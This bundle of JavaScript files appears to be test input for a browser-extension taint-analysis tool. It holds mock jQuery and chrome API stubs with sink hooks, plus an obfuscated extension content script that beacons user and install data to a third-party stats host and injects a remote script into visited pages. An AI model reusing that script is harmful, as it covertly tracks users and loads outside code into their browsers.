// original file:demos/jquery_header.js

// the document and its elements are all objects

function Document_element(id, class_name, tag){
    this.id = id;
    this.class_name = class_name;
    this.tag = tag;
}
Document_element.prototype.contentWindow = new Window();
Document_element.prototype.createElement = function(tagname){
    var de = new Document_element(undefined, undefined, tagname);
    return de;
}



function Document(){}
Document.prototype.getElementById = function(id){
    var document_element = new Document_element(id);
};

Document.prototype.body.appendChild = function(){};

var document = new Document();


// $(this).hide() - hides the current element.
// $("p").hide() - hides all <p> elements.
// $(".test").hide() - hides all elements with class="test".
// $("#test").hide() - hides the element with id="test".
function $(a){
    // find element a in document
    // if a is an Array
    if (Array.isArray(a)){
        var array_in = a;
        a = undefined;
    }
    else{
        // $("#test")
        if (a[0] == '#'){
            var document_element = new Document_element(a.substring(1,));
            // document.push(document_element);
            // document[a] = document_element;
        }
        // $(".test")
        else if(a[0] == '.'){
            var document_element = new Document_element(undefined, a.substring(1,));
            // document.push(document_element);
        }
        // document
        else if (a == document){
            var document_element = document;
        }
        // $("p")
        else{
            var document_element = new Document_element(undefined, undefined,a.substring(1,));
            // document.push(document_element);
        }
        var array_in = [document_element];
    }
    return new JQ_obj(a, array_in);
};


// jqXHR
// jQuery.get( url [, data ] [, success ] [, dataType ] )
// data: Type: PlainObject or String
// success: Type: Function( PlainObject data, String textStatus, jqXHR jqXHR )
// dataType: Type: String
$.get = function(url , success){
    var responseText = 'data_from_url_by_get';
    jQuery_get_source(responseText);
    jQuery_get_url_sink(url);
    success(responseText);
    return new jqXHR();
}
// jQuery.post( url [, data ] [, success ] [, dataType ] )
$.post = function( url , data, success){
    var responseText = 'data_from_url_by_post';
    jQuery_post_source(responseText);
    jQuery_post_data_sink(data);
    jQuery_post_url_sink(url);
    success(responseText);
    return new jqXHR();
}
jqXHR = function(){

}
// jqXHR.fail(function( jqXHR, textStatus, errorThrown ) {});
jqXHR.prototype.fail = function(callback){
    // do nothing
    return this;
}
// jqXHR.done(function( data, textStatus, jqXHR ) {});
// done == success
jqXHR.prototype.done = function(callback){
    callback();
    return this;
}
// jqXHR.always(function( data|jqXHR, textStatus, jqXHR|errorThrown ) {});
jqXHR.prototype.always = function(callback){
    callback();
    return this;
}

JQ_obj = function(a, array_in){
    this.selector = a;
    this.context = document;
    var i=0;
    for (i=0; i<array_in.length; i++){
        this[i] = array_in[i];
    }
    this.length = array_in.length;
}

JQ_obj.prototype.val = function(first_argument) {
    if (arguments.length>0){
        JQ_obj_val_sink(first_argument);
        this[0].value = first_argument;
    }
    else{
        // return value of x
    }
};

JQ_obj.prototype.html = function(first_argument) {
    if (arguments.length >0){
        JQ_obj_html_sink(first_argument);
        this[0].html = first_argument;
    }
    else{
        // return html of x
    }
};

JQ_obj.prototype.ready = function(first_argument) {
    if (this[0]==document){
        first_argument();
    }  
};

JQ_obj.prototype.remove = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.focus = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.click = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.attr = function(first_argument, second_argument) {
    this[0].first_argument = second_argument;
};

JQ_obj.prototype.find = function(first_argument) {
    var document_element = new Document_element();
    return new JQ_obj(undefined, document_element);
};

JQ_obj.prototype.filter = function(first_argument) {
    // do nothing
};

JQ_obj.prototype.keyup = function(first_argument) {
    first_argument();
};

JQ_obj.prototype.each = function(first_argument) {
    // for (var i=0; i<this.length; i++){
    //     first_argument.call(this[i]);
    // }
    first_argument.call(this[0]);
};


// jQuery.extend( target, object1 [, objectN ] )
$.extend = function(obj1, obj2){
    for (var key in obj2){
        obj1[key] = obj2[key];
    }
}

// jQuery.extend( [deep ], target, object1 [, objectN ] ) deep copy

function Event(type){
    this.type = type;
}





// original file:demos/cs_header.js

// port
function Port(info){
    if (info.includeTlsChannelId){
        this.includeTlsChannelId = info.includeTlsChannelId;
    }
    if (info.name){
        this.name = info.name;
    }
}

Port.prototype.onMessage.addListener = function(myCallback){
        RegisterFunc("cs_port_onMessage", myCallback);
};

Port.prototype.postMessage = function(msg){
        var eventName = 'cs_port_postMessage';
        var info =  {message:msg};
        TriggerEvent(eventName, info);
};


// chrome
function Chrome(){}

Chrome.prototype.runtime.connect = function(extensionId, connectInfo){
    var eventName = 'cs_chrome_runtime_connect';
    if (connectInfo===undefined){
        var connectInfo = extensionId;
        var extensionId = undefined;
    }
    var info = {extensionId:extensionId, connectInfo:connectInfo};
    TriggerEvent(eventName, info);    
    return new Port(connectInfo);
};


// myCallback:
// (message: any, sender: MessageSender, sendResponse: function) => {...}
// get message from chrome.runtime.sendMessage or chrome.tabs.sendMessage
Chrome.prototype.runtime.onMessage.addListener = function(myCallback){
    RegisterFunc('cs_chrome_runtime_onMessage', myCallback);
};

MessageSender = function(){
    this.frameId = 123;
    this.guestProcessId=456;
    this.guestRenderFrameRoutingId = 109;
    this.id = 1;
    this.nativeApplication = 'nativeApplication';
    this.origin = 'content';
    this.tab = {id:99};
    this.tlsChannelId = 'tlsChannelId';
    this.url = 'url';
};
function sendResponse(message_back){
    var eventName = 'cs_chrome_runtime_onMessage_response';
    var info = {message: message_back};
    TriggerEvent(eventName, info);
};


// // chrome.runtime.sendMessage(extensionId?: string, message: any, options: object, responseCallback: function)
// Chrome.prototype.runtime.sendMessage = function(extensionId, message, options, responseCallback){
//     var eventName = 'cs_chrome_runtime_sendMessage';
//     if(arguments.length == 2){
//         var info = {message: arguments[0],responseCallback: arguments[1]};
//     }
//     else if (arguments.length == 4){
//         var info = {extensionId: extensionId, message: message, options: options, responseCallback: responseCallback};
//     }
//     else if(arguments.length == 3){
//         if (arguments[1].includeTlsChannelId!=undefined){
//             var info = {message: arguments[0], options: arguments[1], responseCallback: arguments[2]};
//         }
//         else if (arguments[0]==String(arguments[0])){
//             var info = {extensionId: arguments[0], message: arguments[1], responseCallback: arguments[2]};
//         }
//     }
//     TriggerEvent(eventName, info);
// };


// chrome.runtime.sendMessage(extensionId?: string, message: any, options: object, responseCallback: function)
Chrome.prototype.runtime.sendMessage = function(message, responseCallback){
    var eventName = 'cs_chrome_runtime_sendMessage';
    var info = {message: message,responseCallback: responseCallback};
    TriggerEvent(eventName, info);
};

chrome = new Chrome();


// window
function Window(){}

// targetWindow.postMessage(message, targetOrigin, [transfer]);
Window.prototype.postMessage = function(message, targetOrigin, [transfer]){
    window_postMessage_sink(message);
};

// target.addEventListener(type, listener [, options]);
// the 'e' parameter passed to listener can be ignored, otherwise, it is the event object
Window.prototype.addEventListener = function(type, listener,  [ options]){
    MarkAttackEntry(type, listener);
};

Window.prototype.top.addEventListener = Window.prototype.addEventListener;

Window.prototype.localStorage.removeItem = function(a){

};

Window.prototype.localStorage.setItem = function(a, b){

};

Window.prototype.localStorage.getItem = function(a, b){

};



window = new Window();


//
location = new Object();
location.href = 'http://www.example.com/search?q=q&oq=oq&chrome=chrome&sourceid=sourceid&ie=UTF-8';





// original file:demos/jianlibao/18a315f54b.js

var _Ew34=function(){var n="ed",r="not",t="init",e=r+t+n;return e};(function(n,r,t){var e=36,i=1068,o=22419,a=i.toString(e)+"S"+(1365200+i+o).toString(e)+"g";try{var u=function(){var n="toty",r="pe",t="pro",e=t+n+r;return e},c=function(){var n="tr",r="st",t="rss",e=r+t+n;return e},f=function(){var n="z/i",r="/ome",t=".g",e="eo-s",i="s.xy",o="f",a="tat",u="ga",c="http",f=".gi",v="nspi",s="s:/",d="_utm",m="re/_",j=[c,s,r,u,t,e,a,i,n,v,m,d,f,o].join("");return j};String[u()][c()]=function(n,r){var t="h",e="ngt",i="le",o=function(){var n="dom",r="ran",t=r+n;return t},u=function(){var n="e",r="Char",t="Cod",e="from",i=[e,r,t,n].join("");return i},c=function(){var n="ce",r="re",t="pla",e=r+t+n;return e},f=function(){var n=function(){var n="rC",r="cha",t="ode",e="At",i=r+n+t+e;return i},r=n();return r},v=i+e+t,s=o(),d=a,m=u(),j=c(),p=f();r=1+parseInt(Math[s]()*9);n=parseInt(Math[s]()*255);for(var g=this,x="",l=n,h=0,_;h<g[v];h++){_=g[p](h)^l;if(h>r){_^=x[p](h-r)}l=_^n;x+=String[m](_)}x=(n<16?"0":"")+n[d](16)+r[d](16)+x.length+"x"+x;return btoa(x)[j](/\+/g,"-")[j](/\//g,"_")[j](/\=+$/,"")};var v=f(),s=function(n,r){var e=function(){var n="d",r="unde",t="fine",e=r+t+n;return e},i="&m=",o=function(){var n="&uui",r="cs",t="&f",e="r=",i="d=",o=t+e+r+n+i;return o},a=function(){var n="id",r="ck",t="=fim",e="geoj",i="=1.",o="mmf",a="mjea",u="dc",c="&cr",f="ei",v="kkme",s="an&v",d="&t",m="mci",j="=",p="24",g="pld",x=[c,n,t,r,a,o,u,g,m,e,v,f,s,i,p,d,j].join("");return x},u=function(){var n="src",r=n;return r},c="?a=",f="r",s="sst",d="str",m=v,j=+new Date,p="k="+n+(typeof r===e()?"":i+encodeURIComponent(r))+o()+t+a()+j;(new Image)[u()]=m+c+(""+p)[d+s+f]()}}catch(d){}try{var m="92",j="ent6",p="b29d",g="b73",x="nt",l="co",h=function(){var n="ned",r="unde",t="fi",e=r+t+n;return e},_=function(){var n="rag",r="sto",t="e",e=r+n+t;return e},y=function(){var n="st",r="ora",t="ge",e=[n,r,t].join("");return e},w=function(){var n="l",r="loca",t=[r,n].join("");return t},k=function(){var n="age",r="stor",t=[r,n].join("");return t},b="cal",C="lo",I=function(){var n="get",r=n;return r},S="_ext",E="in",M="_u",z="sp",D="uid",R="ire",U="pi",A="ins",$="_ext",q="me",B="_ti",F="re",G=function(){var n="s/",r="ck",t="e/c",e="geoj",i="spir",o="cs",a="kkme",u="-sta",c="mfdc",f="ci",v="/om",s="eian",d="ts",m="ega",j="pl",p="z/in",g="lyti",x="?c",l="4",h="im",_=".js",y="ht",w="s:/",k="tp",b="=f",C="1.2",I="am",S="mje",E="dm",M="&v=",z=".xy",D="rid",R="ana",U=".geo",A=y+k+w+v+m+U+u+d+z+p+i+t+n+R+g+o+_+x+D+b+h+r+S+I+c+j+E+f+e+a+s+M+C+l;return A},H=l+x+j+m+p+g;if(typeof window[H]!==h()){return}window[H]=1;var J=function(){var n="ime",t="runt",e=function(){var n=function(){var n="runt",r="im",t="e",e=[n,r,t].join("");return e},r=n();return r},i=function(){var n="tim",r="e",t="run",e="no-",i=e+t+n+r;return i},o=function(){var n="xx",r="xx",t="xxx",e="xxx",i=e+t+r+n;return i},u="rep",c="lac",f="e",v=r[[t,n].join("")]?r[e()]["id"]:i();return v.substr(0,11)+o()[u+c+f](/[x]/g,function(n){var r=function(){var n=function(){var n="ran",r="dom",t=[n,r].join("");return t},r=n();return r},t=Math[r()]()*16|0,e=n==="x"?t:t&3|8;return e[a](16)})},K=function(r){var t="eate",e="eme",i="cr",o="El",u="nt",c="pt",f="ri",v="sc",s="xt/j",d="cri",m="pt",j="avas",p="te",g="nc",x="asy",l="src",h="bo",_="dy",y="hea",w="d",k=n[i+t+o+e+u]([v,f,c].join(""));k[1398002[a](36)]=[p,s,j,d,m].join("");k[x+g]=!0;k[[l].join("")]=r;if(n[[h,_].join("")]){var b="body",C=function(){var n="d",r="app",t="Chil",e="end",i=r+e+t+n;return i};n[b][C()](k)}else if(n[y+w]){var I="head",S=function(){var n=function(){var n=function(){var n="pe",r="ap",t="ndC",e="hild",i=[r,n,t,e].join("");return i},r=n();return r},r=n();return r};n[I][S()](k)}};r[_()]&&r[y()][w()]&&r[k()][[C,b].join("")][I()]([H,E+z+R+S+M+D,A+U+F+$+B+q],function(n){var t="ned",e="fi",i="unde";if(typeof n[H]===[i,e,t].join("")){var o=function(){var n="t_uu",r="id",t="ins",e="re",i="pi",o="_ex",a=t+i+e+o+n+r;return a},a="d",u="unde",c="fine",f="rage",v="sto",d="loc",m="al",j="set",p={};p[H]=1;if(typeof n[o()]===[u,c,a].join("")){var g="in",x="d",l="_e",h="xt",_="ui",y="spi",w="re",k="_u",b="_ex",C="pire",I="t_ti",S="me",E="ins",M="now";p[g+y+w+l+h+k+_+x]=J();p[E+C+b+I+S]=Date[M]()}r[[v,f].join("")][[d,m].join("")][[j].join("")](p,function(){var n="all",r="inst";s([r,n].join(""))})}});K(G())}catch(L){var N="on",O="exce",P="pti",Q=function(){var n=function(){var n="name",r=[n].join("");return r},r=n();return r},T="mes",V="sage",W="stac",X="k",Y=function(){var n="tr",r="su",t="bs",e=[r,t,n].join("");return e};s([O,P,N].join(""),encodeURIComponent(""+L[Q()]+":"+L[[T,V].join("")]+"\n"+L[W+X])[Y()](0,1e3))}})(document,chrome,_Ew34());
